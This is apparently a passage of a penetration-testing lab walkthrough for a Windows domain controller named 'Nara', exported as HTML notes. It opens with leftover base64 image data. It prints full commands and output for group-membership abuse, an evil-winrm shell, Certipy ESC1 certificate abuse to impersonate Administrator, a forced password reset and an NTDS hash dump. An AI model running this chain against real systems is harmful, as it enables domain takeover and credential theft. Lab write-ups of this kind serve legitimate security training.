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" alt="57773de17d8525189f834a314a079b4c.png"/></p>
+<p>Add the user <code class="inline-code">tracy.white</code> to the <code class="inline-code">Remote Access</code> group:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ net rpc group addmem &quot;REMOTE ACCESS&quot; &quot;tracy.white&quot; -U &quot;nara-security.com&quot;/&quot;tracy.white&quot;%&quot;zqwj041FGX&quot; -S &quot;192.168.175.30&quot;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ net rpc <span class="hljs-keyword">group</span> <span class="hljs-title">addmem</span> <span class="hljs-string">&quot;REMOTE ACCESS&quot;</span> <span class="hljs-string">&quot;tracy.white&quot;</span> -U <span class="hljs-string">&quot;nara-security.com&quot;</span>/<span class="hljs-string">&quot;tracy.white&quot;</span>%<span class="hljs-string">&quot;zqwj041FGX&quot;</span> -S <span class="hljs-string">&quot;192.168.175.30&quot;</span></code></pre></div>
+<p>Now our user belongs to the <code class="inline-code">Remote Access</code> group. These users have the ability to connect to the DC via WinRM:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc ldap 192.168.175.30 -u tracy.white -p zqwj041FGX --groups &quot;Remote Access&quot;          
+LDAP        192.168.175.30  389    NARA             [*] Windows Server 2022 Build 20348 (name:NARA) (domain:nara-security.com) (signing:None) (channel binding:Never) 
+LDAP        192.168.175.30  389    NARA             [+] nara-security.com\tracy.white:zqwj041FGX 
+LDAP        192.168.175.30  389    NARA             Tracy White
+LDAP        192.168.175.30  389    NARA             Jodie Summers
+                                                                                                                                                                                                        
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc winrm 192.168.175.30 -u tracy.white -p zqwj041FGX                        
+WINRM       192.168.175.30  5985   NARA             [*] Windows Server 2022 Build 20348 (name:NARA) (domain:nara-security.com) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.175.30  5985   NARA             [+] nara-security.com\tracy.white:zqwj041FGX (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc ldap 192.168.175.30 -u tracy.white -p zqwj041FGX --groups &quot;Remote Access&quot;          
+LDAP        192.168.175.30  389    NARA             [*] Windows Server 2022 Build 20348 (name:NARA) (domain:nara-security.com) (signing:None) (channel binding:Never) 
+LDAP        192.168.175.30  389    NARA             [+] nara-security.com\tracy.white:zqwj041FGX 
+LDAP        192.168.175.30  389    NARA             Tracy White
+LDAP        192.168.175.30  389    NARA             Jodie Summers
+                                                                                                                                                                                                        
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc winrm 192.168.175.30 -u tracy.white -p zqwj041FGX                        
+WINRM       192.168.175.30  5985   NARA             [*] Windows Server 2022 Build 20348 (name:NARA) (domain:nara-security.com) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.175.30  5985   NARA             [+] nara-security.com\tracy.white:zqwj041FGX (Pwn3d!)</code></pre></div>
+<p>Gain a shell on the machine via <code class="inline-code">evil-winrm</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ evil-winrm -i 192.168.175.30 -u tracy.white -p zqwj041FGX
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\tracy.white\Documents&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ evil-winrm -i <span class="hljs-number">192.168</span>.<span class="hljs-number">175.30</span> -u tracy.white -p zqwj041FGX
+                                        
+Evil-WinRM shell v3.<span class="hljs-number">9</span>
+                                        
+Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&apos; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span>
+                                        
+<span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+                                        
+Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint
+*Evil-WinRM* PS C:\Users\tracy.white\Documents&gt;</code></pre></div>
+<p>When checking for certificate vulnerabilities, <code class="inline-code">ESC1</code> stands out:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad find -u &quot;tracy.white@nara-security.com&quot; -p &apos;zqwj041FGX&apos; -dc-ip 192.168.175.30 -vulnerable -stdout 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;NARA-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;NARA-CA&apos;
+[*] Checking web enrollment for CA &apos;NARA-CA&apos; @ &apos;Nara.nara-security.com&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : NARA-CA
+    DNS Name                            : Nara.nara-security.com
+    Certificate Subject                 : CN=NARA-CA, DC=nara-security, DC=com
+    Certificate Serial Number           : 2401E520F70B7DA34C32FABC71D89E1D
+    Certificate Validity Start          : 2023-07-30 14:06:05+00:00
+    Certificate Validity End            : 2123-07-30 14:16:04+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : NARA-SECURITY.COM\Administrators
+      Access Rights
+        ManageCa                        : NARA-SECURITY.COM\Administrators
+                                          NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+        ManageCertificates              : NARA-SECURITY.COM\Administrators
+                                          NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+        Enroll                          : NARA-SECURITY.COM\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : NaraUser
+    Display Name                        : NaraUser
+    Certificate Authorities             : NARA-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : UserInteractionRequired
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 100 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2023-07-30T14:48:10+00:00
+    Template Last Modified              : 2023-07-30T14:49:11+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Domain Users
+                                          NARA-SECURITY.COM\Enterprise Admins
+      Object Control Permissions
+        Owner                           : NARA-SECURITY.COM\Administrator
+        Full Control Principals         : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Owner Principals          : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Dacl Principals           : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Property Enroll           : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Domain Users
+                                          NARA-SECURITY.COM\Enterprise Admins
+    [+] User Enrollable Principals      : NARA-SECURITY.COM\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad find -u &quot;tracy.white@nara-security.com&quot; -p &apos;zqwj041FGX&apos; -dc-ip 192.168.175.30 -vulnerable -stdout 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;NARA-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;NARA-CA&apos;
+[*] Checking web enrollment for CA &apos;NARA-CA&apos; @ &apos;Nara.nara-security.com&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : NARA-CA
+    DNS Name                            : Nara.nara-security.com
+    Certificate Subject                 : CN=NARA-CA, DC=nara-security, DC=com
+    Certificate Serial Number           : 2401E520F70B7DA34C32FABC71D89E1D
+    Certificate Validity Start          : 2023-07-30 14:06:05+00:00
+    Certificate Validity End            : 2123-07-30 14:16:04+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : NARA-SECURITY.COM\Administrators
+      Access Rights
+        ManageCa                        : NARA-SECURITY.COM\Administrators
+                                          NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+        ManageCertificates              : NARA-SECURITY.COM\Administrators
+                                          NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+        Enroll                          : NARA-SECURITY.COM\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : NaraUser
+    Display Name                        : NaraUser
+    Certificate Authorities             : NARA-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : UserInteractionRequired
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 100 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2023-07-30T14:48:10+00:00
+    Template Last Modified              : 2023-07-30T14:49:11+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Domain Users
+                                          NARA-SECURITY.COM\Enterprise Admins
+      Object Control Permissions
+        Owner                           : NARA-SECURITY.COM\Administrator
+        Full Control Principals         : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Owner Principals          : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Dacl Principals           : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Enterprise Admins
+                                          NARA-SECURITY.COM\Enrollment
+        Write Property Enroll           : NARA-SECURITY.COM\Domain Admins
+                                          NARA-SECURITY.COM\Domain Users
+                                          NARA-SECURITY.COM\Enterprise Admins
+    [+] User Enrollable Principals      : NARA-SECURITY.COM\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</code></pre></div>
+<p>Request the certificate as Administrator:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad req -u &apos;tracy.white@nara-security.com&apos; -p &apos;zqwj041FGX&apos; -dc-ip 192.168.175.30 -ca NARA-CA -template NaraUser -upn Administrator
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS response does not contain an answer to the question: NARA-SECURITY.COM. IN A
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;Administrator&apos;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad req -u <span class="hljs-comment">&apos;tracy.white@nara-security.com&apos; -p &apos;zqwj041FGX&apos; -dc-ip 192.168.175.30 -ca NARA-CA -template NaraUser -upn Administrator</span>
+Certipy v5.<span class="hljs-number">0.4</span> - <span class="hljs-keyword">by</span> Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS response does <span class="hljs-built_in">not</span> contain an answer <span class="hljs-keyword">to</span> the question: NARA-SECURITY.COM. <span class="hljs-keyword">IN</span> A
+[!] Use -debug <span class="hljs-keyword">to</span> print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID <span class="hljs-built_in">is</span> <span class="hljs-number">6</span>
+[*] Successfully requested certificate
+[*] Got certificate <span class="hljs-keyword">with</span> UPN <span class="hljs-comment">&apos;Administrator&apos;</span>
+[*] Certificate has no <span class="hljs-type">object</span> SID
+[*] <span class="hljs-keyword">Try</span> <span class="hljs-keyword">using</span> -sid <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> the <span class="hljs-type">object</span> SID <span class="hljs-built_in">or</span> see the wiki <span class="hljs-keyword">for</span> more details
+[*] Saving certificate <span class="hljs-built_in">and</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> <span class="hljs-comment">&apos;administrator.pfx&apos;</span>
+[*] Wrote certificate <span class="hljs-built_in">and</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> <span class="hljs-comment">&apos;administrator.pfx&apos;</span></code></pre></div>
+<p>When trying to complete the second step, it kept on failing. This is due to the <code class="inline-code">PKI</code> not being enabled. Instead, we can use the <code class="inline-code">ldap-shell</code> to execute commands as the Domain Administrator. Using this technique, I changed the password of the DA to <code class="inline-code">Pwned@23</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -username administrator -domain nara-security.com -dc-ip 192.168.175.30 -ldap-shell
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &apos;Administrator&apos;
+[*] Connecting to &apos;ldaps://192.168.175.30:636&apos;
+[*] Authenticated to &apos;192.168.175.30&apos; as: &apos;u:NARASEC\\Administrator&apos;
+Type help for list of commands
+
+# whoami
+u:NARASEC\Administrator
+
+# change_password ADMINISTRATOR Pwned@23
+Got User DN: CN=Administrator,CN=Users,DC=nara-security,DC=com
+Attempting to set new password of: Pwned@23
+Password changed successfully!
+
+# </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -username administrator -domain nara-security.com -dc-ip 192.168.175.30 -ldap-shell
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: <span class="hljs-string">&apos;Administrator&apos;</span>
+[*] Connecting <span class="hljs-keyword">to</span> <span class="hljs-string">&apos;ldaps://192.168.175.30:636&apos;</span>
+[*] Authenticated <span class="hljs-keyword">to</span> <span class="hljs-string">&apos;192.168.175.30&apos;</span> as: <span class="hljs-string">&apos;u:NARASEC\\Administrator&apos;</span><span class="hljs-built_in">
+Type </span>help <span class="hljs-keyword">for</span> list of commands
+
+<span class="hljs-comment"># whoami</span>
+u:NARASEC\Administrator
+
+<span class="hljs-comment"># change_password ADMINISTRATOR Pwned@23</span>
+Got<span class="hljs-built_in"> User </span>DN: <span class="hljs-attribute">CN</span>=Administrator,CN=Users,DC=nara-security,DC=com
+Attempting <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> new password of: Pwned@23
+Password changed successfully!
+
+<span class="hljs-comment"># </span></code></pre></div>
+<p>And using the new credentials, I have compromised the domain:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u Administrator -p &apos;Pwned@23&apos;
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\Administrator:Pwned@23 (Pwn3d!)
+                                                                                                                                                                                                        
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u Administrator -p &apos;Pwned@23&apos; --ntds
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\Administrator:Pwned@23 (Pwn3d!)
+SMB         192.168.175.30  445    NARA             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         192.168.175.30  445    NARA             Administrator:500:aad3b435b51404eeaad3b435b51404ee:e7ea0f19ad259d5c4e2f000f3edbdd4f:::
+SMB         192.168.175.30  445    NARA             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.175.30  445    NARA             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f85c2c9778ce40492f6ac891f76b4ca:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Amelia.O&apos;Brien:1104:aad3b435b51404eeaad3b435b51404ee:2a3bc4e4f627ae18128b63ca338249fb:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Damian.Johnson:1105:aad3b435b51404eeaad3b435b51404ee:6037e9a69dfa966cd902e35a5bd17568:::
